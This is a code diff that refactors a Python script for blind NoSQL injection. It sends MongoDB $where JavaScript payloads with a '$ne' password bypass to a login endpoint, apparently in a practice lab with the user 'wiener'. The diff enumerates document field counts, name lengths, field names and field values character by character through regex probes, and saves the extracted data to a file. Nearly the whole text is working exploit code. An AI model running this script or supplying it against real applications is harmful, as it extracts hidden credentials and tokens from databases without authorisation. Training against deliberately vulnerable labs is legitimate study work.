@@ -49,112 +49,59 @@ def escape_regex_character(character):
         return '\\\\' + character
     return character
 
-def get_number_of_fields(url, field_count):
-    payload = {
-        "username": "wiener",
-        "password": {
-            "$ne": None
-        },
-        "$where": f"function(){{ if (Object.keys(this).length=={field_count}) return 1; else return 0; }}"
-    }
-    return make_request(url, payload), payload
+def get_number_of_fields(url):
+    progress_bar = log.progress("Enumerating number of fields")
+    progress_bar.status("Starting brute-force attack")
+    
+    count = 0
+    while True:
+        payload = {
+            "username": "wiener",
+            "password": {
+                "$ne": None
+            },
+            "$where": f"function(){{ if (Object.keys(this).length=={count}) return 1; else return 0; }}"
+        }
+        
+        progress_bar.status(payload["$where"])
+        
+        if make_request(url, payload):
+            log.success(f"Fields found: {count}")
+            progress_bar.success("Completed")
+            return count
+        
+        count += 1
 
-def get_field_lengths(url, field_index, length):
-    payload = {
-        "username": "wiener",
-        "password": {
-            "$ne": None
-        },
-        "$where": f"function(){{ if (Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
-    }
-    return make_request(url, payload), payload
-
-def get_field_value_lengths(url, field_name, length):
-    payload = {
-        "username": "wiener",
-        "password": {
-            "$ne": None
-        },
-        "$where": f"function(){{ if (this.{field_name}.valueOf().toString().length=={length}) return 1; else return 0; }}"
-    }
-    return make_request(url, payload), payload
-
-def enumerate_field_lengths(url, total_fields):
+def get_field_lengths(url, total_fields):
     field_lengths_list = []
     print()
     progress_bar = log.progress("Enumerating field lengths")
     
     for current_field_index in range(total_fields):
         current_length = 0
-        length_found = False
         
-        while not length_found:
-            result, payload = get_field_lengths(url, current_field_index, current_length)
+        while True:
+            payload = {
+                "username": "wiener",
+                "password": {
+                    "$ne": None
+                },
+                "$where": f"function(){{ if (Object.keys(this)[{current_field_index}].length=={current_length}) return 1; else return 0; }}"
+            }
+            
             progress_bar.status(payload["$where"])
-            if result:
+            
+            if make_request(url, payload):
                 field_lengths_list.append(current_length)
-                length_found = True
                 log.success(f"Field {current_field_index}: {current_length}")
-            else:
-                current_length += 1
+                break
+            
+            current_length += 1
     
     progress_bar.success("Completed")
     return field_lengths_list
 
-def enumerate_field_value_lengths(url, field_names_list, field_indexes):
-    field_value_lengths = {}
-    print()
-    progress_bar = log.progress("Enumerating field value lengths")
-    
-    for current_field_index in field_indexes:
-        current_field_name = field_names_list[current_field_index]
-        if current_field_name is None:
-            log.warning(f"Skipping field (invalid name)")
-            field_value_lengths[current_field_name] = None
-            continue
-        
-        current_value_length = 0
-        value_length_found = False
-        
-        while not value_length_found:
-            result, payload = get_field_value_lengths(url, current_field_name, current_value_length)
-            progress_bar.status(payload["$where"])
-            
-            if result:
-                field_value_lengths[current_field_name] = current_value_length
-                value_length_found = True
-                log.success(f"Field {current_field_index}: {current_value_length}")
-            else:
-                current_value_length += 1
-    
-    progress_bar.success("Completed")
-    return field_value_lengths
-
-def get_fields_characters(url, field_index, position, character):
-    escaped_character = escape_regex_character(character)
-    
-    payload = {
-        "username": "wiener",
-        "password": {
-            "$ne": None
-        },
-        "$where": f"function(){{ if (Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
-    }
-    return make_request(url, payload), payload
-
-def get_field_values_characters(url, field_name, position, character):
-    escaped_character = escape_regex_character(character)
-    
-    payload = {
-        "username": "wiener",
-        "password": {
-            "$ne": None
-        },
-        "$where": f"function(){{ if (this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
-    }
-    return make_request(url, payload), payload
-
-def enumerate_field_names(url, field_lengths_list):
+def get_field_names(url, field_lengths_list):
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
     field_names_list = []
     print()
@@ -174,10 +121,19 @@ def enumerate_field_names(url, field_lengths_list):
             character_found = None
             
             for character in characters:
-                result, payload = get_fields_characters(url, current_field_index, current_position, character)
+                escaped_character = escape_regex_character(character)
+                
+                payload = {
+                    "username": "wiener",
+                    "password": {
+                        "$ne": None
+                    },
+                    "$where": f"function(){{ if (Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{escaped_character}.*')) return 1; else return 0; }}"
+                }
+                
                 progress_bar.status(payload["$where"])
                 
-                if result:
+                if make_request(url, payload):
                     extracted_field_name += character
                     character_found = character
                     field_progress_bar.status(extracted_field_name)
@@ -194,7 +150,42 @@ def enumerate_field_names(url, field_lengths_list):
     progress_bar.success("Completed")
     return field_names_list
 
-def enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes):
+def get_field_value_lengths(url, field_names_list, field_indexes):
+    field_value_lengths = {}
+    print()
+    progress_bar = log.progress("Enumerating field value lengths")
+    
+    for current_field_index in field_indexes:
+        current_field_name = field_names_list[current_field_index]
+        if current_field_name is None:
+            log.warning(f"Skipping field (invalid name)")
+            field_value_lengths[current_field_name] = None
+            continue
+        
+        current_value_length = 0
+        
+        while True:
+            payload = {
+                "username": "wiener",
+                "password": {
+                    "$ne": None
+                },
+                "$where": f"function(){{ if (this.{current_field_name}.valueOf().toString().length=={current_value_length}) return 1; else return 0; }}"
+            }
+            
+            progress_bar.status(payload["$where"])
+            
+            if make_request(url, payload):
+                field_value_lengths[current_field_name] = current_value_length
+                log.success(f"Field {current_field_index}: {current_value_length}")
+                break
+            
+            current_value_length += 1
+    
+    progress_bar.success("Completed")
+    return field_value_lengths
+
+def get_field_value_names(url, field_names_list, field_value_lengths, field_indexes):
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
     field_values = {}
     print()
@@ -221,10 +212,19 @@ def enumerate_field_values(url, field_names_list, field_value_lengths, field_ind
             character_found = None
             
             for character in characters:
-                result, payload = get_field_values_characters(url, current_field_name, current_position, character)
+                escaped_character = escape_regex_character(character)
+                
+                payload = {
+                    "username": "wiener",
+                    "password": {
+                        "$ne": None
+                    },
+                    "$where": f"function(){{ if (this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{escaped_character}.*')) return 1; else return 0; }}"
+                }
+                
                 progress_bar.status(payload["$where"])
                 
-                if result:
+                if make_request(url, payload):
                     extracted_field_value += character
                     character_found = character
                     field_progress_bar.status(extracted_field_value)
@@ -241,33 +241,12 @@ def enumerate_field_values(url, field_names_list, field_value_lengths, field_ind
     progress_bar.success("Completed")
     return field_values
 
-def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
-    initialize_session(proxy_url)
-    
-    progress_bar = log.progress("Enumerating number of fields")
-    progress_bar.status("Starting brute-force attack")
-    total_fields_found = None
-    count = 0
-    
-    while total_fields_found is None:
-        result, payload = get_number_of_fields(url, count)
-        progress_bar.status(payload["$where"])
-        
-        if result:
-            total_fields_found = count
-            log.success(f"Fields found: {count}")
-            break
-        count += 1
-    
-    progress_bar.success(f"Completed")
-    
-    field_lengths_list = enumerate_field_lengths(url, total_fields_found)
-    field_names_list = enumerate_field_names(url, field_lengths_list)
-    
+def prompt_field_selection(total_fields, field_names_list):
     field_indexes = []
+    
     while not field_indexes:
         print()
-        user_input = input(f"[?] Enter field indexes to dump (0-{total_fields_found-1}, comma-separated) or 'all' for all fields: ").strip()
+        user_input = input(f"[?] Enter field indexes to dump (0-{total_fields-1}, comma-separated) or 'all' for all fields: ").strip()
         
         if user_input.lower() == 'all':
             field_indexes = [i for i, name in enumerate(field_names_list) if name is not None]
@@ -296,40 +275,72 @@ def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
             except ValueError:
                 log.warning("Invalid input. Please enter numbers separated by commas or 'all'.")
     
-    field_value_lengths = enumerate_field_value_lengths(url, field_names_list, field_indexes)
+    return field_indexes
+
+def save_and_display_results(field_indexes, field_names_list, field_values, output_file):
+    print()
+    log.info("Fields and values")
     
-    field_values = enumerate_field_values(url, field_names_list, field_value_lengths, field_indexes)
+    results_found = False
     
-    has_valid_results = False
-    for field_index in field_indexes:
-        field_name = field_names_list[field_index]
-        if field_name is not None:
-            has_valid_results = True
-            break
-    
-    if has_valid_results:
-        print()
-        log.info("Fields and values")
-        for field_index in field_indexes:
-            field_name = field_names_list[field_index]
-            field_value = field_values.get(field_name, None)
-            if field_name is not None and field_value is not None:
-                log.info(f"{field_name}:{field_value}")
-            else:
-                log.warning(f"Field {field_index}: Could not be determined")
-        
+    try:
         with open(output_file, 'w') as file_handler:
             for field_index in field_indexes:
                 field_name = field_names_list[field_index]
                 field_value = field_values.get(field_name, None)
+                
                 if field_name is not None and field_value is not None:
+                    log.info(f"{field_name}:{field_value}")
                     file_handler.write(f"{field_name}:{field_value}\n")
+                    results_found = True
                 else:
+                    log.warning(f"Field {field_index}: Could not be determined")
                     file_handler.write(f"Field {field_index}: Could not be determined\n")
         
+        if not results_found:
+            log.warning("No valid results found. File created but empty.")
+            return False
+        
         log.info(f"Results saved to {output_file}")
-    else:
-        log.warning("No valid results found. File not created.")
+        return True
+    except Exception as e:
+        log.error(f"Failed to save results: {e}")
+        return False
+
+def execute_enumeration(url, proxy_url=None, output_file='fields.txt'):
+    initialize_session(proxy_url)
+    
+    total_fields = get_number_of_fields(url)
+    if total_fields is None:
+        log.error("Failed to enumerate number of fields")
+        return
+    
+    field_lengths_list = get_field_lengths(url, total_fields)
+    if not field_lengths_list:
+        log.error("Failed to enumerate field lengths")
+        return
+    
+    field_names_list = get_field_names(url, field_lengths_list)
+    if not field_names_list:
+        log.error("Failed to enumerate field names")
+        return
+    
+    field_indexes = prompt_field_selection(total_fields, field_names_list)
+    if not field_indexes:
+        log.error("No valid field indexes selected")
+        return
+    
+    field_value_lengths = get_field_value_lengths(url, field_names_list, field_indexes)
+    if not field_value_lengths:
+        log.error("Failed to enumerate field value lengths")
+        return
+    
+    field_values = get_field_value_names(url, field_names_list, field_value_lengths, field_indexes)
+    if not field_values:
+        log.error("Failed to enumerate field values")
+        return
+    
+    save_and_display_results(field_indexes, field_names_list, field_values, output_file)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
@@ -343,4 +354,4 @@ if __name__ == '__main__':
     
     args = parser.parse_args()
     
-    execute_nosql_enumeration(url=args.url, proxy_url=args.proxy, output_file=args.output)
+    execute_enumeration(url=args.url, proxy_url=args.proxy, output_file=args.output)
